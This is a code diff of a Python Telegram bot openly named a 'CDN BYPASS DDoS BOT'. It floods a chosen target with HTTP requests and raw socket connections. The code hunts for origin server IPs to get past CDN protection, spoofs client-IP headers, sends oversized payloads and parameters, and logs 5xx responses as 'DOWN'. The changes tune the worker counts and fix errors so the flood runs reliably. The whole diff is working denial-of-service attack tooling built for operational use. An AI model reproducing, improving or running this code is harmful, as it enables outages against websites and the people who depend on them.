@@ -1,7 +1,6 @@
 #!/usr/bin/env python3
 """
-🔥 CDN BYPASS DDoS BOT - RAILWAY DEPLOY 🔥
-Telegram Bot to Control CDN Bypass Attacks
+🔥 CDN BYPASS DDoS BOT - FIXED 🔥
 """
 
 import os
@@ -14,6 +13,7 @@ import requests
 import concurrent.futures
 import urllib3
 import ssl
+import base64
 from urllib.parse import urlparse, urljoin
 import telebot
 from telebot import types
@@ -25,7 +25,7 @@ OWNER_ID = 8935807032
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 ssl._create_default_https_context = ssl._create_unverified_context
 
-# ==================== BOT SETUP ====================
+# ==================== FIX 409: Remove webhook ====================
 bot = telebot.TeleBot(BOT_TOKEN)
 try:
     bot.remove_webhook()
@@ -51,20 +51,18 @@ class CDNBypassAttack:
         self.active = False
         self.origin_ips = []
         self.target_url = None
-        self.workers = 1000
+        self.workers = 200  # Reduced from 1000 to avoid thread limit
         self.duration = 300
         self.max_requests = 1000000
         self.attack_thread = None
         
         self.bypass_endpoints = [
-            '/', '/index.php', '/index.html', '/server-status', '/phpinfo.php',
-            '/.git/config', '/.env', '/wp-config.php', '/config.php',
+            '/', '/index.php', '/index.html', '/server-status',
             '/api/', '/api/v1/', '/graphql', '/admin/', '/login/',
-            '/debug', '/test', '/phpmyadmin/', '/mysql/', '/database/',
-            '/search', '/report', '/export', '/import', '/upload',
-            '/download', '/backup', '/restore', '/cache/clear',
+            '/debug', '/test', '/search', '/report', '/export', '/import',
+            '/upload', '/download', '/backup', '/restore',
             '/api/users', '/api/products', '/api/orders', '/api/reports',
-            '/api/search', '/api/filter', '/api/export', '/api/import'
+            '/api/search', '/api/filter', '/api/export'
         ]
 
     def find_origin_server(self, domain):
@@ -76,7 +74,7 @@ class CDNBypassAttack:
         except:
             return None
 
-    def create_socket_flood(self, host, port=80, count=500):
+    def create_socket_flood(self, host, port=80, count=100):
         try:
             for i in range(count):
                 try:
@@ -106,29 +104,24 @@ class CDNBypassAttack:
             'User-Agent': random.choice([
                 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
-                'curl/7.68.0', 'Wget/1.20.3', 'Python-urllib/3.8'
+                'curl/7.68.0', 'Wget/1.20.3'
             ]),
             'X-Forwarded-For': f'{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}',
             'X-Real-IP': f'{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}',
             'X-Client-IP': f'{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}',
-            'CF-Connecting-IP': f'{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}',
-            'True-Client-IP': f'{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}',
-            'X-Originating-IP': f'{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}',
-            'Accept': '*/*', 'Accept-Language': 'en-US,en;q=0.5',
+            'Accept': '*/*',
+            'Accept-Language': 'en-US,en;q=0.5',
             'Accept-Encoding': 'gzip, deflate, br',
-            'Cache-Control': 'no-cache', 'Pragma': 'no-cache',
+            'Cache-Control': 'no-cache',
             'Connection': 'keep-alive, close',
         }
 
     def generate_resource_intensive_payload(self):
         payload_types = [
-            {'data': ['X' * 10000] * 100},
-            {'nested': {f'level_{i}': {f'sub_{j}': 'Y' * 1000 for j in range(10)} for i in range(10)}},
-            {'items': [i for i in range(100000)]},
-            {'content': 'Z' * 500000},
-            {'expression': '+'.join([str(i**i) for i in range(1000)])},
-            {'query': 'SELECT * FROM large_table WHERE ' + ' OR '.join([f"col{i} LIKE '%test%'" for i in range(50)])},
-            {'file_data': base64.b64encode(b'X' * 1000000).decode(), 'filename': 'large_file.bin'}
+            {'data': ['X' * 10000] * 50},
+            {'nested': {f'level_{i}': {f'sub_{j}': 'Y' * 500 for j in range(5)} for i in range(5)}},
+            {'items': [i for i in range(50000)]},
+            {'content': 'Z' * 200000},
         ]
         return random.choice(payload_types)
 
@@ -141,10 +134,10 @@ class CDNBypassAttack:
             target_host = self.origin_ips[0] if use_origin_ip and self.origin_ips else host
             target_url = f"{scheme}://{target_host}"
             
-            if random.random() < 0.6:
+            if random.random() < 0.3:
                 port = 443 if scheme == 'https' else 80
-                self.create_socket_flood(target_host, port, random.randint(100, 500))
-                return f"SOCKET_BYPASS-{request_id}"
+                self.create_socket_flood(target_host, port, random.randint(20, 50))
+                return f"SOCKET-{request_id}"
             
             session = requests.Session()
             session.trust_env = False
@@ -153,15 +146,15 @@ class CDNBypassAttack:
             endpoint = random.choice(self.bypass_endpoints)
             full_url = urljoin(target_url, endpoint)
             
-            method = random.choice(['GET', 'POST', 'PUT', 'DELETE'])
+            method = random.choice(['GET', 'POST'])
             
-            if method in ['POST', 'PUT']:
+            if method == 'POST':
                 payload = self.generate_resource_intensive_payload()
                 response = session.request(method, full_url, json=payload, headers=headers, timeout=5, allow_redirects=False, verify=False)
             else:
                 params = {}
-                for i in range(random.randint(5, 20)):
-                    params[f'param{i}'] = 'A' * random.randint(1000, 5000)
+                for i in range(random.randint(3, 10)):
+                    params[f'param{i}'] = 'A' * random.randint(500, 2000)
                 response = session.request(method, full_url, params=params, headers=headers, timeout=5, allow_redirects=False, verify=False)
             
             with self.lock:
@@ -171,9 +164,9 @@ class CDNBypassAttack:
                     self.stats['server_errors'] += 1
             
             if response.status_code in [503, 500, 502, 504, 429]:
-                return f"SUCCESS-{request_id} | {response.status_code} | Server Down!"
+                return f"DOWN-{request_id} | {response.status_code}"
             elif response.elapsed.total_seconds() > 3:
-                return f"SLOW-{request_id} | {response.status_code} | Server Stressed"
+                return f"SLOW-{request_id} | {response.status_code}"
             else:
                 return f"REQ-{request_id} | {response.status_code}"
             
@@ -181,30 +174,18 @@ class CDNBypassAttack:
             with self.lock:
                 self.stats['timeout_errors'] += 1
                 self.stats['failed'] += 1
-            return f"TIMEOUT-{request_id} | Server Overwhelmed"
+            return f"TIMEOUT-{request_id}"
         except requests.exceptions.ConnectionError:
             with self.lock:
                 self.stats['connection_errors'] += 1
                 self.stats['failed'] += 1
-            return f"CONN_ERROR-{request_id} | Cannot Connect"
+            return f"CONN-{request_id}"
         except Exception as e:
             with self.lock:
                 self.stats['failed'] += 1
-            return f"ERROR-{request_id} | {str(e)[:20]}"
+            return f"ERR-{request_id}"
 
-    def start_continuous_bypass_attack(self):
-        while self.active:
-            try:
-                use_origin = random.random() < 0.3
-                for i in range(random.randint(10, 50)):
-                    if not self.active:
-                        break
-                    self.send_bypass_request(self.target_url, i, use_origin)
-                time.sleep(0.1)
-            except:
-                time.sleep(0.5)
-
-    def run_attack(self, target_url, duration=300, workers=1000, max_requests=1000000):
+    def run_attack(self, target_url, duration=300, workers=200, max_requests=500000):
         self.target_url = target_url
         self.workers = workers
         self.duration = duration
@@ -216,37 +197,32 @@ class CDNBypassAttack:
         domain = parsed.netloc
         self.find_origin_server(domain)
         
-        # Start threads
-        attack_threads = []
-        for i in range(20):
-            t = threading.Thread(target=self.start_continuous_bypass_attack, daemon=True)
-            t.start()
-            attack_threads.append(t)
-        
-        # Main attack loop
         end_time = time.time() + duration
         request_counter = 0
         
-        with concurrent.futures.ThreadPoolExecutor(max_workers=workers) as executor:
+        # FIX: Reduce workers to avoid thread limit
+        actual_workers = min(workers, 150)
+        
+        with concurrent.futures.ThreadPoolExecutor(max_workers=actual_workers) as executor:
             while time.time() < end_time and self.active and request_counter < max_requests:
-                batch_size = min(workers * 3, 3000)
+                batch_size = min(actual_workers * 2, 500)
                 futures = []
                 
                 for i in range(min(batch_size, max_requests - request_counter)):
                     if time.time() >= end_time or not self.active:
                         break
-                    use_origin = random.random() < 0.4
+                    use_origin = random.random() < 0.3
                     future = executor.submit(self.send_bypass_request, target_url, request_counter, use_origin)
                     futures.append(future)
                     request_counter += 1
                 
                 for future in concurrent.futures.as_completed(futures):
                     try:
-                        future.result(timeout=10)
+                        future.result(timeout=5)
                     except:
                         pass
                 
-                time.sleep(0.01)
+                time.sleep(0.05)
         
         self.active = False
         return self.stats
@@ -351,8 +327,11 @@ def attack_cmd(message):
     bot.reply_to(message, f"🚀 Starting attack on {target}...")
     
     def run():
-        result = attack.run_attack(target)
-        bot.send_message(message.chat.id, f"✅ Attack completed!\n\n{attack.get_stats_text()}")
+        try:
+            result = attack.run_attack(target, workers=150, duration=300, max_requests=500000)
+            bot.send_message(message.chat.id, f"✅ Attack completed!\n\n{attack.get_stats_text()}")
+        except Exception as e:
+            bot.send_message(message.chat.id, f"❌ Attack error: {str(e)[:100]}")
     
     thread = threading.Thread(target=run, daemon=True)
     thread.start()
@@ -383,8 +362,6 @@ def stats_cmd(message):
         return
     
     bot.reply_to(message, attack.get_stats_text())
-
-# ==================== CALLBACKS ====================
 
 @bot.callback_query_handler(func=lambda call: True)
 def handle_callback(call):
@@ -422,8 +399,6 @@ def handle_callback(call):
 • Max Requests: {attack.max_requests:,}
 • Origin IPs: {len(attack.origin_ips)}
 • Active: {'✅' if attack.active else '❌'}
-
-To change: Modify script variables.
 """
         bot.send_message(call.message.chat.id, text)
 
@@ -431,7 +406,7 @@ To change: Modify script variables.
 def main():
     print("""
     ╔═══════════════════════════════════════════════════════════════╗
-    ║   🔥 CDN BYPASS DDoS BOT - RAILWAY DEPLOY                  ║
+    ║   🔥 CDN BYPASS DDoS BOT - FIXED                           ║
     ╚═══════════════════════════════════════════════════════════════╝
     """)
     print(f"✅ Owner: {OWNER_ID}")
